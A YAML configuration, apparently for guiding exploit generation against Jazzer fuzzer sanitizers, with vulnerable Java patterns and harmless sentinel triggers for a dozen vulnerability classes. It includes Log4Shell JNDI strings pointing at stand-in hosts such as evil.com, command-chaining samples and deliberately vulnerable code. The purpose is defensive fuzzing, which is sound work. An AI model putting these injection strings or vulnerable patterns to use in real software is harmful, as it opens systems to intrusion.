Deserialization:
  description: |-
    Detects unsafe Java deserialization vulnerabilities that could lead to remote code execution. The sanitizer monitors ObjectInputStream operations for attempts to deserialize malicious data.

    Java Example Patterns:
    ```java
    // Direct deserialization of untrusted data
    byte[] data = getUntrustedData();
    ObjectInputStream ois = new ObjectInputStream(
        new ByteArrayInputStream(data));
    Object obj = ois.readObject();  // Could execute malicious code

    // Wrapped stream but still unsafe
    InputStream in = wrapStream(getUntrustedData());
    ObjectInputStream ois = new ObjectInputStream(in);
    ois.readObject();  // Could execute malicious code

    // Unsafe deserialization in custom wrapper
    class CustomObjectInputStream extends ObjectInputStream {
        protected Object readObjectOverride() {
            return super.readObject();  // Vulnerable
        }
    }
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
       - The sanitizer hooks ObjectInputStream methods to detect attempts to load the jaz.Zer class
       - Methods monitored:
         * Constructor for stream initialization
         * readObject/readObjectOverride/readUnshared for deserialization
       - Input stream must be markable (auto-wrapped with BufferedInputStream if not)

    2. Mandatory Requirements:
       - Goal: Trigger loading of the "jaz.Zer" class through deserialization
       - Class name MUST be exactly "jaz.Zer" (case-sensitive)
       - Stream MUST contain:
         * Java serialization header (0xACED0005)
         * Serialized jaz.Zer class instance with exact structure:
           - Stream header: 0xACED0005
           - TC_OBJECT + TC_CLASSDESC: 0x7372
           - Class name length: 0x0007
           - Class name: "jaz.Zer"
           - serialVersionUID: 0x000000000000002A
           - Remaining fields as specified

    3. Valid Exploit Patterns - Use ONLY these:
       ```java
      // Will trigger - loads jaz.Zer class
      byte[] payload = new byte[] {
        (byte)0xac, (byte)0xed, 0x00, 0x05,       // Stream header
        0x73, 0x72,                               // TC_OBJECT + TC_CLASSDESC
        0x00, 0x07,                               // Class name length
        'j','a','z','.','Z','e','r',              // "jaz.Zer"
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2a, // serialVersionUID: 42
        0x02,                                     // Flags (Serializable)
        0x00, 0x00,                               // Field count: 0
        0x78,                                     // TC_ENDBLOCKDATA
        0x70                                      // TC_NULL (no superclass)
      };
      ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
      ois.readObject();
       ```

    4. Invalid Patterns - NEVER use these:
       ```java
       // Wrong header - won't initialize stream
       byte[] badHeader = new byte[] {0x00, 0x00, 0x00, 0x00};  // Invalid header
       new ObjectInputStream(new ByteArrayInputStream(badHeader));

       // Wrong class name - won't load jaz.Zer
       byte[] badClass = new byte[] {
           (byte)0xac, (byte)0xed, 0x00, 0x05,  // Valid header
           0x73, 0x72, 0x00, 0x07, 'j','a','x','.','Z','e','r'  // Wrong class
       };
       new ObjectInputStream(new ByteArrayInputStream(badClass)).readObject();
       ```

    Note: The sanitizer specifically looks for attempts to load the jaz.Zer class through deserialization. The class name must match exactly (case-sensitive) and the serialized data structure must be correct.
ExpressionLanguageInjection:
  description: |-
    Expression Language (EL) injection occurs in two main scenarios:
    1. Direct EL evaluation through ExpressionFactory
    2. Bean validation message interpolation (CVE-2018-16621)

    Both can lead to remote code execution if untrusted input is evaluated as an EL expression.

    Java Example Patterns:
    ```java
    // ExpressionFactory vulnerability
    ExpressionFactory factory = ExpressionFactory.newInstance();
    factory.createValueExpression(context, userInput, Object.class);  // Vulnerable if userInput contains EL

    // Bean Validation vulnerability
    @Size(message = "${user.input}")  // Vulnerable if user.input contains malicious EL
    String field;
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
       - The sanitizer hooks EL evaluation methods:
         * ExpressionFactory.createValueExpression
         * ExpressionFactory.createMethodExpression
         * ConstraintValidatorContext.buildConstraintViolationWithTemplate

    2. Mandatory Requirements:
       - Expression MUST be exactly:
         ${Byte.class.forName("jaz.Zer").getMethod("el").invoke(null)}
       - Expression MUST be <= 64 bytes
       - Expression can be part of a larger string
       - Double quotes in class name MUST be escaped with backslash

    3. Valid Exploit Patterns - Use ONLY these:
       ```java
       // Will trigger - exact pattern
       factory.createValueExpression(context,
           "${Byte.class.forName(\"jaz.Zer\").getMethod(\"el\").invoke(null)}",
           Object.class);

       // Will trigger - pattern in larger expression
       context.buildConstraintViolationWithTemplate(
           "Error: ${Byte.class.forName(\"jaz.Zer\").getMethod(\"el\").invoke(null)}");
       ```

    4. Invalid Patterns - NEVER use these:
       ```java
       // Won't trigger - wrong pattern
       factory.createValueExpression(context, "${1+1}", Object.class);
       factory.createValueExpression(context,
           "${Class.forName(\"other.Class\")}", Object.class);
       ```

    Note: The expression must match exactly, including proper escaping of quotes. The expression can be part of a larger string but must not be modified.
FilePathTraversal:
  description: |-
    Path traversal vulnerability occurs when applications use untrusted input to construct file paths without proper validation. This allows attackers to access files outside the intended directory structure.

    Java Example Patterns:
    ```java
    // Direct file access
    String fileName = request.getParameter("file");
    File file = new File(baseDir + fileName);  // Vulnerable to traversal

    // Path operations with user input
    String userPath = "../" + userInput;  // Path traversal possible
    Files.readAllBytes(Paths.get(userPath));  // Can access parent directory

    // File operations without validation
    String path = userInput + "/config.xml";  // No path validation
    new FileInputStream(path);  // Can traverse directories
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
       - The sanitizer hooks Java file operation APIs:
         * java.nio.file.Files methods
         * java.io.File* classes
         * java.nio.channels.FileChannel
         * java.util.Scanner with File
       - Path is normalized before comparison

    2. Mandatory Requirements:
       - Path MUST resolve to exactly "../jazzer-traversal"
       - Path can be either:
         * Relative path matching "../jazzer-traversal"
         * Absolute path matching the absolute version of target
       - Path MUST contain directory traversal

    3. Valid Exploit Patterns - Use ONLY these:
       ```java
       // Direct relative path
       Files.readAllBytes(Paths.get("../jazzer-traversal"));

       // Using file stream
       new FileInputStream("../jazzer-traversal");

       // Using File
       new File("../jazzer-traversal").exists();
       ```

    4. Invalid Patterns - NEVER use these:
       ```java
       // Wrong target
       Files.readAllBytes(Paths.get("../other-file"));

       // No traversal
       Files.readAllBytes(Paths.get("jazzer-traversal"));

       // Too much traversal
       Files.readAllBytes(Paths.get("../../../jazzer-traversal"));

       // Wrong path after normalization
       new File("./jazzer-traversal").exists();
       ```

    Note: The sanitizer normalizes paths before comparison and supports both absolute and relative paths.
LdapInjection:
  name_chars:
    description: |-
      LDAP Distinguished Name (DN) injection vulnerability occurs when applications construct LDAP DNs using untrusted input without proper escaping. This allows attackers to manipulate the DN structure and potentially access unauthorized directory information.

      Java Example Patterns:
      ```java
      // Direct DN construction
      String username = request.getParameter("user");
      String dn = "cn=" + username + ",dc=example,dc=com";  // Vulnerable to injection
      ctx.search(dn, attrs);  // DirContext search with DN

      // Multiple attribute DN
      String dept = userInput;  // Attacker controlled
      String dn = "ou=" + dept + ",dc=example,dc=com";  // Vulnerable
      ctx.search(dn, attrs);  // DirContext search with DN

      // Dynamic DN lookup
      String attr = request.getParameter("attr");  // From user
      ctx.search("cn=" + attr + "=*,dc=example,dc=com", controls);  // Vulnerable
      ```

    exploit: |-
      To generate a valid exploit for this sanitizer, follow these strict requirements:

      1. Target Implementation:
         - The sanitizer hooks javax.naming.directory.DirContext search methods
         - Must trigger Exception due to unescaped special characters
         - Must be in DN string parameter

      2. Mandatory Requirements:
         - DN string can use one of these special characters:
           * Plus sign (+)
           * Less than (<)
           * Greater than (>)
           * Comma (,)
           * Semicolon (;)
           * Double quote (")
           * Equals sign (=)
         - Character MUST be unescaped
         - Character MUST cause Exception

      3. Valid Exploit Patterns - Use ONLY these:
         ```java
         // Single special character
         dirContext.search("cn=+", attrs);
         dirContext.search("cn=test;", attrs);

         // Multiple special characters
         dirContext.search("cn=test<>", attrs);
         dirContext.search("cn=\"test\",dc=example", attrs);
         ```

      4. Invalid Patterns - NEVER use these:
         ```java
         // NO escaped characters
         dirContext.search("cn=\\+", attrs);
         dirContext.search("cn=\\<\\>", attrs);

         // NO safe characters
         dirContext.search("cn=test123", attrs);
         dirContext.search("cn=normal-name", attrs);

         // NO valid DN syntax
         dirContext.search("cn=admin,dc=example,dc=com", attrs);
         ```

      Note: While specific characters are suggested, any unescaped character causing NamingException will trigger the finding.

  filter_chars:
    description: |-
      LDAP search filter injection vulnerability occurs when applications construct LDAP search filters using untrusted input without proper escaping. This allows attackers to manipulate the filter logic and potentially access unauthorized directory information.

      Java Example Patterns:
      ```java
      // Direct filter construction
      String username = request.getParameter("user");
      String filter = "(uid=" + username + ")";  // Vulnerable to injection
      dirContext.search(baseDN, filter, controls);  // DirContext search with filter

      // Multiple attribute filter
      String dept = userInput;  // Attacker controlled
      String filter = "(&(dept=" + dept + ")(type=employee))";  // Vulnerable
      dirContext.search(baseDN, filter, controls);  // DirContext search with filter

      // Dynamic attribute filter
      String attr = request.getParameter("attr");  // From user
      dirContext.search(baseDN, "(" + attr + "=*)", controls);  // Vulnerable
      ```

    exploit: |-
      To generate a valid exploit for this sanitizer, follow these strict requirements:

      1. Target Implementation:
         - The sanitizer hooks javax.naming.directory.DirContext search methods
         - Must trigger Exception due to unescaped special characters
         - Must be in filter string parameter

      2. Mandatory Requirements:
         - Filter string can use one of these special characters:
           * Asterisk (*)
           * Left parenthesis (()
           * Right parenthesis ())
           * Backslash (\\)
           * Null byte (\0)
         - Character MUST be unescaped
         - Character MUST cause Exception

      3. Valid Exploit Patterns - Use ONLY these:
         ```java
         // Single special character
         dirContext.search(baseDN, "*", controls);
         dirContext.search(baseDN, "(uid=\\)", controls);

         // Multiple special characters
         dirContext.search(baseDN, "(uid=())", controls);
         dirContext.search(baseDN, "(uid=*\\)", controls);
         ```

      4. Invalid Patterns - NEVER use these:
         ```java
         // NO escaped characters
         dirContext.search(baseDN, "(uid=\\2a)", controls);
         dirContext.search(baseDN, "(uid=\\28\\29)", controls);

         // NO safe characters
         dirContext.search(baseDN, "(uid=test123)", controls);
         dirContext.search(baseDN, "(uid=normal-name)", controls);

         // NO valid filter syntax
         dirContext.search(baseDN, "(uid=admin)", controls);
         ```

      Note: While specific characters are suggested, any unescaped character causing InvalidSearchFilterException will trigger the finding.
NamingContextLookup:
  description: |-
    JNDI lookup vulnerability occurs when applications perform JNDI lookups with untrusted input. This allows attackers to trigger remote code execution through malicious LDAP servers or RMI registries, especially in combination with expression injection like Log4Shell (CVE-2021-44228).

    Java Example Patterns:
    ```java
    // Direct JNDI lookup
    String lookupName = request.getParameter("name");
    Context ctx = new InitialContext();
    Object obj = ctx.lookup(lookupName);  // Vulnerable to injection

    // Dynamic service lookup
    String serviceName = getServiceName();  // From untrusted source
    Service service = (Service) context.lookup("ldap://" + serviceName);  // Vulnerable with LDAP
    RemoteService remote = (RemoteService) ctx.lookup("rmi://" + serviceName);  // Vulnerable with RMI

    // Log4j vulnerability (CVE-2021-44228)
    String userInput = "${jndi:ldap://malicious.com/exploit}";  // LDAP variant
    String rmiInput = "${jndi:rmi://evil.com/exploit}";         // RMI variant
    logger.error("User input: {}", userInput);  // Vulnerable to Log4Shell
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
      - The sanitizer hooks Context lookup methods for JNDI lookups:
        * lookup(String)
        * lookupLink(String)
      - Always throws CommunicationException for safety
      - Goal: Attempt JNDI lookup using either LDAP or RMI protocol

    2. Mandatory Requirements:
      - URL MUST be either:
        * "ldap://g.co/" for LDAP protocol
        * "rmi://g.co/" for RMI protocol
      - Host MUST be "g.co"
      - Additional path components are allowed
      - Both protocols work interchangeably with same methods

    3. Valid Exploit Patterns - Use ONLY these:
      ```java
      // Basic lookups - both protocols work
      ctx.lookup("ldap://g.co/");      // Using LDAP
      ctx.lookup("rmi://g.co/");       // Using RMI

      // With lookupLink - both protocols work
      ctx.lookupLink("ldap://g.co/");  // Using LDAP
      ctx.lookupLink("rmi://g.co/");   // Using RMI

      // With path components - both protocols work
      ctx.lookup("ldap://g.co/cn=admin");       // LDAP path
      ctx.lookup("rmi://g.co/RemoteService");   // RMI path

      // Log4j patterns - both protocols work
      logger.info("${jndi:ldap://g.co/}");  // LDAP variant
      logger.error("${jndi:rmi://g.co/}");   // RMI variant
      ```

    4. Invalid Patterns - NEVER use these:
      ```java
      // Wrong host
      ctx.lookup("ldap://other.com/");
      ctx.lookup("rmi://other.com/");

      // Wrong protocol format
      ctx.lookup("ldaps://g.co/");
      ctx.lookup("rmis://g.co/");
      ```

  Note: The vulnerability is the same whether using LDAP or RMI protocol - both allow for
    remote code execution through JNDI lookups. The sanitizer accepts either protocol with
    the same target host.
OsCommandInjection:
  description: |-
    OS Command Injection occurs when applications pass untrusted input to system command execution functions without proper validation. This allows attackers to execute arbitrary commands on the host system.

    Java Example Patterns:
    ```java
    // Direct command execution
    String command = "ls " + userInput;  // Attacker controlled
    Runtime.getRuntime().exec(command);  // Vulnerable

    // Process builder with shell
    ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", "cat " + userInput);  // Vulnerable
    pb.start();

    // Command array with untrusted input
    String[] cmd = {"/bin/sh", "-c", userInput};  // Vulnerable
    Runtime.getRuntime().exec(cmd);
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
       - The sanitizer hooks ProcessImpl.start()
       - This is the common execution point for both Runtime.exec() and ProcessBuilder
       - Goal: Execute exactly the command "jazze" without any modifications

    2. Mandatory Requirements:
       - Command MUST be exactly "jazze" (no more, no less)
       - Command MUST be executed without any arguments
       - Command MUST NOT include any path components
       - Command MUST be executed in isolation (no command chaining)

    3. Valid Exploit Patterns - Use ONLY these:
       ```java
       // Using Runtime.exec
       Runtime.getRuntime().exec("jazze");

       // Using ProcessBuilder
       new ProcessBuilder("jazze").start();
       ```

    4. Invalid Patterns - NEVER use these:
       ```java
       // NO command chaining
       Runtime.getRuntime().exec("jazze; ls");
       Runtime.getRuntime().exec("jazze && other");

       // NO arguments
       Runtime.getRuntime().exec(new String[]{"jazze", "arg1"});
       new ProcessBuilder("jazze", "--help").start();

       // NO paths
       new ProcessBuilder("/usr/bin/jazze").start();
       new ProcessBuilder("./jazze").start();
       ```

    Note: The command doesn't need to exist or execute successfully. The sanitizer only checks that the exact command "jazze" is being executed.
ReflectiveCall:
  library:
    description: |-
      Native library loading vulnerability occurs when applications load native libraries based on untrusted input. This allows attackers to load malicious libraries that can execute arbitrary native code with the application's privileges.

      Java Example Patterns:
      ```java
      // Direct library loading
      String libName = request.getParameter("lib");
      System.loadLibrary(libName);  // Vulnerable to library injection

      // Absolute path loading
      String path = config.getLibraryPath();  // From untrusted source
      System.load(path);  // Can load arbitrary libraries

      // Runtime loading
      String feature = getFeatureName();  // External input
      Runtime.getRuntime().loadLibrary(feature);  // Vulnerable
      ```

    exploit: |-
      To generate a valid exploit for this sanitizer, follow these strict requirements:

      1. Target Implementation:
         - The sanitizer hooks library loading methods:
           * System.load/loadLibrary
           * Runtime.load/loadLibrary
           * ClassLoader.findLibrary

      2. Mandatory Requirements:
         - Library name MUST be exactly "jazzer_honeypot"
         - Name MUST be case-sensitive
         - Name MUST NOT include any path components
         - Name MUST NOT include file extensions

      3. Valid Exploit Patterns - Use ONLY these:
         ```java
         System.loadLibrary("jazzer_honeypot");  // Correct implementation
         Runtime.getRuntime().loadLibrary("jazzer_honeypot");  // Correct implementation
         ClassLoader.getSystemClassLoader().findLibrary("jazzer_honeypot");  // Correct implementation
         ```

      4. Invalid Patterns - NEVER use these:
         ```java
         // NO paths
         System.load("/usr/lib/jazzer_honeypot.so");
         System.load("./jazzer_honeypot");

         // NO file extensions
         System.loadLibrary("jazzer_honeypot.so");
         System.loadLibrary("jazzer_honeypot.dll");

         // NO wrong names
         System.loadLibrary("other_library");
         System.loadLibrary("JAZZER_HONEYPOT");  // Case sensitive

         // NO additional components
         System.loadLibrary("lib/jazzer_honeypot");
         System.loadLibrary("jazzer_honeypot/lib");
         ```

      Note: The sanitizer only validates the library name. No actual library needs to exist or be loaded successfully.

  class:
    description: |-
      Reflective class loading vulnerability occurs when applications load Java classes based on untrusted input. This allows attackers to load and execute malicious code by specifying arbitrary class names through reflection.

      Java Example Patterns:
      ```java
      // Direct class loading
      String className = request.getParameter("class");
      Class<?> cls = Class.forName(className);  // Vulnerable to class injection

      // Custom class loader
      String type = config.getType();  // From untrusted source
      Class<?> cls = classLoader.loadClass(type);  // Can load malicious classes

      // Dynamic instantiation
      String impl = getImplementation();  // From configuration
      Class.forName(impl).getDeclaredConstructor().newInstance();  // Vulnerable
      ```

    exploit: |-
      To generate a valid exploit for this sanitizer, follow these strict requirements:

      1. Target Implementation:
         - The sanitizer hooks class loading methods:
           * Class.forName variants
           * ClassLoader.loadClass variants

      2. Mandatory Requirements:
         - Class name MUST be exactly "jaz.Zer"
         - Name MUST be case-sensitive
         - Name MUST NOT include additional package parts
         - Name MUST contain exactly one dot (.)

      3. Valid Exploit Patterns - Use ONLY these:
         ```java
         Class.forName("jaz.Zer");  // Correct implementation
         Class.forName("jaz.Zer", true, classLoader);  // Correct implementation
         ClassLoader.getSystemClassLoader().loadClass("jaz.Zer");  // Correct implementation
         ```

      4. Invalid Patterns - NEVER use these:
         ```java
         // NO additional package parts
         Class.forName("com.example.jaz.Zer");
         Class.forName("org.jaz.Zer");

         // NO wrong names
         Class.forName("other.Class");
         Class.forName("JAZ.ZER");  // Case sensitive

         // NO malformed names
         Class.forName("jaz/Zer");
         Class.forName("jazZer");  // Missing dot
         Class.forName("jaz.Zer.Class");  // Too many dots
         ```

      Note: The sanitizer only validates the class name. No actual class needs to exist or be loaded successfully.
RegexInjection:
  canon_eq:
    description: |-
      Detects regex vulnerabilities that exploit Pattern.CANON_EQ flag to cause memory exhaustion. When this flag is enabled, consecutive Unicode combining marks can trigger super-exponential array allocations.

      Java Example Patterns:
      ```java
      // Vulnerable - CANON_EQ with unvalidated input
      String userInput = "...";  // Contains combining marks
      Pattern.compile(userInput, Pattern.CANON_EQ);  // Memory exhaustion

      // Still vulnerable even with Pattern.quote()
      Pattern.compile(Pattern.quote(userInput), Pattern.CANON_EQ);  // Memory exhaustion

      // Safe - no CANON_EQ flag
      Pattern.compile(userInput);  // No memory issues
      ```

    exploit: |-
      To generate a valid exploit for this sanitizer, follow these strict requirements:

      1. Target Implementation:
         - The sanitizer hooks Pattern.compile with CANON_EQ flag
         - No exception is required, only the presence of specific sequence

      2. Mandatory Requirements:
         - Pattern MUST use Pattern.CANON_EQ flag
         - Pattern MUST contain exactly three consecutive grave accent combining marks (U+0300)
         - Marks can appear anywhere in the pattern

      3. Valid Exploit Patterns - Use ONLY these:
         ```java
         // Direct sequence
         Pattern.compile("\u0300\u0300\u0300", Pattern.CANON_EQ);

         // With surrounding content
         Pattern.compile("prefix\u0300\u0300\u0300suffix", Pattern.CANON_EQ);

         // In quoted text
         Pattern.compile(Pattern.quote("a\u0300\u0300\u0300b"), Pattern.CANON_EQ);
         ```

      4. Invalid Patterns - NEVER use these:
         ```java
         // NO missing CANON_EQ flag
         Pattern.compile("\u0300\u0300\u0300");

         // NO insufficient marks
         Pattern.compile("\u0300\u0300", Pattern.CANON_EQ);

         // NO non-consecutive marks
         Pattern.compile("\u0300x\u0300\u0300", Pattern.CANON_EQ);
         Pattern.compile("\u0300\u0300x\u0300", Pattern.CANON_EQ);
         ```

      Note: The pattern just needs to contain the three consecutive combining marks with CANON_EQ flag. No actual pattern matching or exception is required.

  pattern_syntax:
    description: |-
      Detects regex injection vulnerabilities that can cause CPU exhaustion through malformed patterns. The sanitizer looks for patterns that break out of quotes and character classes, causing PatternSyntaxException.

      Java Example Patterns:
      ```java
      // Vulnerable - direct input in pattern
      String userInput = "...";  // Contains malicious pattern
      Pattern.compile("[a-z" + userInput);  // Can break pattern syntax

      // Vulnerable - in string operations
      str.replaceAll(userInput, "replacement");  // Can inject malicious pattern
      str.replaceFirst(userInput, "replacement");  // Can inject malicious pattern
      str.split(userInput);  // Can inject malicious pattern
      str.split(userInput, 2);  // Can inject malicious pattern with limit
      ```

    exploit: |-
      To generate a valid exploit for this sanitizer, follow these strict requirements:

      1. Target Implementation:
         - The sanitizer hooks regex pattern methods:
           * Pattern.compile, Pattern.matches
           * String.matches, String.replaceAll, String.replaceFirst
           * String.split (with or without limit)

      2. Mandatory Requirements:
         - Pattern MUST cause PatternSyntaxException
         - Exception message MUST NOT be "Stack overflow during pattern compilation"
         - Pattern can use any syntax error except stack overflow

      3. Valid Exploit Patterns - Use ONLY these:
         ```java
         // Using guided pattern
         Pattern.compile("\\E]\\E]]]]]]");

         // Simple syntax errors
         Pattern.compile("[");  // Unclosed character class
         Pattern.compile("(");  // Unclosed group
         Pattern.compile("\\"); // Incomplete escape

         // String method variants
         "test".replaceAll("[", "x");
         "test".split("\\", 2);
         ```

      4. Invalid Patterns - NEVER use these:
         ```java
         // NO valid patterns
         Pattern.compile("[a-z]+");
         Pattern.compile(".*");

         // NO stack overflow errors
         Pattern.compile("(((((" + ")))))");

         // NO escaped patterns
         Pattern.compile(Pattern.quote("["));
         Pattern.compile("\\[");
         ```

      Note: While the sentinel suggests a specific pattern, any pattern causing PatternSyntaxException (except stack overflow) will trigger the finding.
ScriptEngineInjection:
  description: |-
    Script Engine Injection vulnerability occurs when applications pass untrusted input to script evaluation functions without proper validation. This allows attackers to execute arbitrary code through the script engine, potentially leading to remote code execution. Before JDK 15, the Nashorn Engine was registered by default with ScriptEngineManager under aliases including "js", allowing access to JVM classes like java.lang.Runtime for OS command execution. Other scripting engines following the JSR-223 specification can also be embedded in the JVM.

    Java Example Patterns:
    ```java
    // Direct script evaluation
    String userScript = request.getParameter("script");
    scriptEngine.eval(userScript);  // Vulnerable to injection

    // Expression binding
    String expr = getExpression();  // From untrusted source
    scriptEngine.eval("var result = " + expr);  // Vulnerable

    // Reader-based evaluation
    Reader reader = new StringReader(userInput);  // From untrusted source
    scriptEngine.eval(reader);  // Vulnerable

    // With script context
    ScriptContext context = new SimpleScriptContext();
    scriptEngine.eval(userScript, context);  // Vulnerable
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
       - The sanitizer hooks javax.script.ScriptEngine eval methods:
         * eval(String)
         * eval(String, ScriptContext)
         * eval(String, Bindings)
         * eval(Reader)
         * eval(Reader, ScriptContext)
         * eval(Reader, Bindings)

    2. Mandatory Requirements:
       - Goal: Include the exact string "jaz"+"zer" in script content
       - Pattern MUST use double quotes (not single quotes)
       - Pattern MUST use + operator for concatenation
       - For Reader input, content is read fully before checking

    3. Valid Exploit Patterns - Use ONLY these:
       ```java
       // Direct pattern
       scriptEngine.eval("\"jaz\"+\"zer\"");

       // In assignment
       scriptEngine.eval("var x = \"jaz\"+\"zer\";");

       // In function
       scriptEngine.eval("function f() { return \"jaz\"+\"zer\"; }");

       // With Reader
       scriptEngine.eval(new StringReader("alert(\"jaz\"+\"zer\")"));
       ```

    4. Invalid Patterns - NEVER use these:
       ```java
       // NO direct string
       scriptEngine.eval("\"jazzer\"");

       // NO escaped pattern
       scriptEngine.eval("\"jaz\\\"\\+\\\"zer\"");

       // NO single quotes
       scriptEngine.eval("'jaz'+'zer'");
       ```

    Note: The sanitizer requires the exact string "jaz"+"zer" in the script content, using double quotes and the + operator exactly as shown.
ServerSideRequestForgery:
  description: |-
    Server Side Request Forgery (SSRF) vulnerability occurs when applications make network connections using untrusted input. This allows attackers to make the server connect to arbitrary network destinations, potentially accessing internal services or sensitive data.

    Java Example Patterns:
    ```java
    // Direct socket connection
    String host = request.getParameter("host");
    Socket socket = new Socket(host, port);  // Vulnerable to SSRF

    // HTTP client request
    String target = userInput;  // Attacker controlled
    HttpClient.newBuilder().build()
        .send(HttpRequest.newBuilder(URI.create(target)).build(),
              HttpResponse.BodyHandlers.ofString());  // Vulnerable

    // Socket channel
    String host = getHost();  // From untrusted source
    SocketChannel.open(new InetSocketAddress(host, port));  // Can connect anywhere

    // URL connection
    String url = config.getUrl();  // External input
    URLConnection conn = new URL(url).openConnection();  // Vulnerable to SSRF
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
       - The sanitizer hooks Java networking APIs:
         * java.net.Socket
         * java.net.SocketImpl
         * java.nio.channels.SocketChannel
         * java.net.http.HttpClient

    2. Mandatory Requirements:
       - Host MUST be exactly "jazzer.example.com"
       - Port MUST be valid (0-65535)
       - Connection attempt MUST use hooked networking APIs
       - Connection doesn't need to succeed

    3. Valid Exploit Patterns - Use ONLY these:
       ```java
       // Direct socket connection
       new Socket("jazzer.example.com", 8080);

       // Using InetAddress
       new Socket(InetAddress.getByName("jazzer.example.com"), 80);

       // Using SocketChannel
       SocketChannel.open(new InetSocketAddress("jazzer.example.com", 443));

       // Using HttpClient
       HttpClient.newBuilder().build()
           .send(HttpRequest.newBuilder()
               .uri(URI.create("http://jazzer.example.com"))
               .build(),
           HttpResponse.BodyHandlers.ofString());
       ```

    4. Invalid Patterns - NEVER use these:
       ```java
       // NO invalid ports
       new Socket("jazzer.example.com", -1);
       new Socket("jazzer.example.com", 70000);

       // NO wrong hostnames
       new Socket("other.example.com", 80);
       new Socket("jazzer.example.org", 80);

       // NO IP addresses
       new Socket("127.0.0.1", 80);
       new Socket(InetAddress.getByName("192.168.1.1"), 80);

       // NO URL modifications
       new URL("https://jazzer.example.com:8080/path").openConnection();
       new Socket("subdomain.jazzer.example.com", 80);
       ```

    Note: The sanitizer only checks for connection attempts to the target domain with valid ports. The connection doesn't need to succeed - just attempting the connection will trigger the finding.
SqlInjection:
  description: |-
    SQL injection vulnerability occurs when applications construct SQL queries using untrusted input without proper escaping or parameterization. This allows attackers to modify the query structure and execute arbitrary SQL commands, potentially accessing or modifying unauthorized data.

    Java Example Patterns:
    ```java
    // Direct string concatenation
    String username = request.getParameter("user");
    String query = "SELECT * FROM users WHERE name = '" + username + "'";  // Vulnerable
    statement.executeQuery(query);

    // Multiple conditions
    String category = userInput;  // Attacker controlled
    String sql = "SELECT * FROM products WHERE category = '" + category +
                 "' AND active = true";  // Vulnerable

    // LIKE clause
    String search = request.getParameter("search");  // From user
    String sql = "SELECT * FROM items WHERE name LIKE '%" + search + "%'";  // Vulnerable

    // ORDER BY clause
    String sortField = getSortField();  // External input
    String sql = "SELECT * FROM data ORDER BY " + sortField;  // Vulnerable
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
       - The sanitizer hooks SQL execution methods:
         * Statement.execute*
         * EntityManager.createNativeQuery
       - Must trigger these conditions:
         * SQL syntax validation failure (via JSQLParser)
         * SQL exceptions

    2. Mandatory Requirements:
       - Query can use one of these special characters:
         * Single quote (')
         * Double quote (")
         * Backspace (\b)
         * Newline (\n)
         * Carriage return (\r)
         * Tab (\t)
         * Backslash (\\)
         * Percent sign (%)
         * Underscore (_)
       - Query MUST cause SQL syntax validation to fail
       - Query MUST trigger one of these exceptions:
         * java.sql.SQLException
         * java.sql.SQLNonTransientException
         * java.sql.SQLSyntaxErrorException
         * org.h2.jdbc.JdbcSQLSyntaxErrorException
         * org.h2.jdbc.JdbcSQLFeatureNotSupportedException

    3. Valid Exploit Patterns - Use ONLY these:
       ```java
       Statement stmt = connection.createStatement();

       // Single quote injection
       stmt.executeQuery("SELECT * FROM users WHERE name = '''");

       // Double quote injection
       stmt.executeQuery("SELECT * FROM users WHERE name = \"");

       // Special character injection
       stmt.executeQuery("SELECT * FROM data WHERE id = \n");
       ```

    4. Invalid Patterns - NEVER use these:
       ```java
       // NO properly escaped quotes
       stmt.executeQuery("SELECT * FROM users WHERE name = '\''");
       stmt.executeQuery("SELECT * FROM users WHERE name = '\\''");

       // NO valid SQL syntax
       stmt.executeQuery("SELECT * FROM users WHERE id = 1");
       stmt.executeQuery("SELECT * FROM nonexistent");  // Invalid table but valid syntax

       // NO prepared statements
       PreparedStatement pstmt = connection.prepareStatement("SELECT * FROM users WHERE name = ?");
       pstmt.executeQuery();

       // NO other methods
       resultSet.getString("column");
       connection.prepareCall("{ call proc }");
       ```

    Note: While the sentinel characters guide the fuzzer, ANY unescaped character that causes both SQL syntax validation failure and a specified SQL exception will trigger the finding. The query doesn't need to be executable - it just needs to fail validation and throw the right exception.
TimeoutDenialOfService:
  description: |-
    Timeout Denial of Service vulnerability occurs when applications process user-controllable input in a way that can lead to infinite loops, excessive recursion, or deliberate time-consuming operations. This allows attackers to consume server resources and potentially make the service unavailable to legitimate users.

    Java Example Patterns:
    ```java
    // Infinite loop from user input
    String userInput = request.getParameter("iterations");
    int count = Integer.parseInt(userInput);
    for (int i = 0; i < count; i++) {  // Vulnerable if count is very large or negative
        // Processing
    }

    // While loop with user-controlled condition
    String input = request.getParameter("condition");
    while (complexCondition(input)) {  // Vulnerable if condition always evaluates to true
        // Processing that never breaks the loop
    }

    // Regex with catastrophic backtracking
    String pattern = request.getParameter("pattern");  // User-controlled
    String text = getLargeText();
    Pattern.compile(pattern).matcher(text).matches();  // Vulnerable with patterns like "(a+)+"

    // Sleep based on user input
    String delayParam = request.getParameter("delay");
    int delay = Integer.parseInt(delayParam);
    Thread.sleep(delay);  // Vulnerable if delay is user-controlled

    // Recursive function with user-controlled depth
    int depth = Integer.parseInt(request.getParameter("depth"));
    recursiveFunction(depth);  // Vulnerable with large depth values
    ```

  exploit: |-
    To generate a valid exploit for this sanitizer, follow these strict requirements:

    1. Target Implementation:
       - The sanitizer hooks methods that can lead to timeouts:
         * Thread.sleep
         * TimeUnit.sleep
         * Loop constructs with user-controlled bounds
         * Recursive methods with user-controlled depth
         * Regex pattern matching with potential catastrophic backtracking

    2. Mandatory Requirements:
       - Exploit MUST use user-controllable input that affects:
         * Loop iteration count
         * Sleep duration
         * Recursion depth
         * Regex pattern complexity
       - Exploit MUST potentially cause execution time to exceed reasonable limits
       - No exception is required, only the potential for excessive execution time

